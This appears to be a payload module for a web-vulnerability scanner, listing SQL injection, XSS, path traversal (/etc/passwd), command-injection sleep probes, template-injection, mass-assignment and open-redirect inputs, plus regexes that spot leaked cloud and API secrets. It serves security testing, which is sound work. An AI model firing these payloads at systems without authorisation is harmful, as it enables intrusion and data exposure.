"""
attacks/payloads.py — curated payload corpora + oracle signatures.

Deliberately small, high-signal sets (not full seclists): enough to prove each
vuln class with low false positives. Extend freely.
"""

# --- SQL injection -----------------------------------------------------------
SQLI_PROBES = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "1 OR 1=1",
    "' UNION SELECT NULL--",
]
# time-based (used for blind SQLi: response should be measurably slower)
SQLI_TIME_PROBES = ["' OR SLEEP(5)-- -", "'; SELECT pg_sleep(5)-- -", "1) OR SLEEP(5)-- -"]
SQLI_TIME_THRESHOLD_MS = 4500

# server-side errors that prove the payload reached a SQL engine
SQL_ERROR_SIGNATURES = [
    "sql syntax", "syntax error at or near", "unclosed quotation mark",
    "psycopg2", "sqlite3.operationalerror", "sqlalchemy", "ora-0",
    "you have an error in your sql", "pg::", "sqlstate",
    "quoted string not properly terminated", "unterminated quoted string",
]

# --- XSS ---------------------------------------------------------------------
def xss_probes(marker: str) -> list:
    """Reflection/stored payloads carrying a unique marker so we can verify echo."""
    return [
        f"<script>{marker}</script>",
        f"\"><img src=x onerror={marker}>",
        f"<svg/onload={marker}>",
        f"'><b>{marker}</b>",
    ]

# --- Path traversal ----------------------------------------------------------
PATH_TRAVERSAL_PROBES = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
]
TRAVERSAL_SIGNATURES = ["root:x:0:0:", "root:.:0:0:", "daemon:", "[fonts]", "[extensions]"]

# --- Mass assignment: privileged fields an attacker tries to smuggle in -------
MASS_ASSIGNMENT_FIELDS = {
    "role": "admin",
    "is_admin": True,
    "isAdmin": True,
    "admin": True,
    "is_staff": True,
    "is_superuser": True,
    "permissions": ["*"],
    "verified": True,
    "is_verified": True,
    "email_verified": True,
    "balance": 999999,
    "credit": 999999,
    "discount": 100,
}

# --- Broken auth: tokens that MUST be rejected -------------------------------
INVALID_TOKENS = [
    "Bearer invalid_token_qa_probe",
    "Bearer null",
    "Bearer 00000000-0000-0000-0000-000000000000",
]

# --- Server-Side Template Injection ------------------------------------------
# Use an uncommon product so a coincidental match is near-impossible.
SSTI_MARKER_A, SSTI_MARKER_B = 1337, 1331
SSTI_EXPECTED = str(SSTI_MARKER_A * SSTI_MARKER_B)   # "1779547"
SSTI_PROBES = [
    f"{{{{{SSTI_MARKER_A}*{SSTI_MARKER_B}}}}}",        # Jinja2/Twig  {{1337*1331}}
    f"${{{SSTI_MARKER_A}*{SSTI_MARKER_B}}}",           # JSP/Spring EL ${...}
    f"#{{{SSTI_MARKER_A}*{SSTI_MARKER_B}}}",           # Ruby/Thymeleaf #{...}
    f"<%= {SSTI_MARKER_A}*{SSTI_MARKER_B} %>",         # ERB
    f"{{{SSTI_MARKER_A}*{SSTI_MARKER_B}}}",            # generic
]

# --- OS command injection (time-based, mirrors blind SQLi) -------------------
CMD_TIME_PROBES = ["; sleep 5", "| sleep 5", "$(sleep 5)", "& ping -c 5 127.0.0.1", "`sleep 5`"]
CMD_TIME_THRESHOLD_MS = 4500

# --- Open redirect -----------------------------------------------------------
OPEN_REDIRECT_PARAMS = {"url", "redirect", "redirect_uri", "redirect_url", "next",
                        "return", "return_url", "returnto", "dest", "destination",
                        "continue", "callback", "to", "goto", "target"}
OPEN_REDIRECT_MARK_HOST = "qa-evil.example.com"
OPEN_REDIRECT_PAYLOADS = [
    f"https://{OPEN_REDIRECT_MARK_HOST}/",
    f"//{OPEN_REDIRECT_MARK_HOST}/",
    f"https:%2f%2f{OPEN_REDIRECT_MARK_HOST}/",
]

# --- CORS --------------------------------------------------------------------
CORS_EVIL_ORIGIN = "https://qa-evil.example.com"

# --- Secrets / sensitive data exposure (high-signal only → near-zero FP) ------
import re as _re  # noqa: E402

SECRET_PATTERNS = [
    ("AWS access key id", _re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("AWS secret access key", _re.compile(r"\baws_secret_access_key\b\s*[:=]\s*['\"]?[A-Za-z0-9/+]{40}")),
    ("Private key block", _re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----")),
    ("Stripe live secret key", _re.compile(r"\bsk_live_[0-9a-zA-Z]{16,}\b")),
    ("Google API key", _re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b")),
    ("Slack token", _re.compile(r"\bxox[baprs]-[0-9A-Za-z-]{10,}\b")),
    ("GitHub token", _re.compile(r"\bghp_[0-9A-Za-z]{36}\b")),
    ("Generic API secret assignment", _re.compile(
        r"['\"]?(?:api[_-]?secret|client[_-]?secret|secret[_-]?key)['\"]?\s*[:=]\s*['\"][A-Za-z0-9/+_\-]{16,}['\"]")),
]


def idor_candidates(original) -> list:
    """Neighbouring/likely-foreign ids to probe for horizontal access."""
    out = []
    try:
        n = int(original)
        out += [n + 1, n - 1, n + 2, 1, 2, 0, 9999]
    except (TypeError, ValueError):
        out += [1, 2, 3]
    seen, res = set(), []
    for c in out:
        s = str(c)
        if s != str(original) and s not in seen:
            seen.add(s)
            res.append(s)
    return res
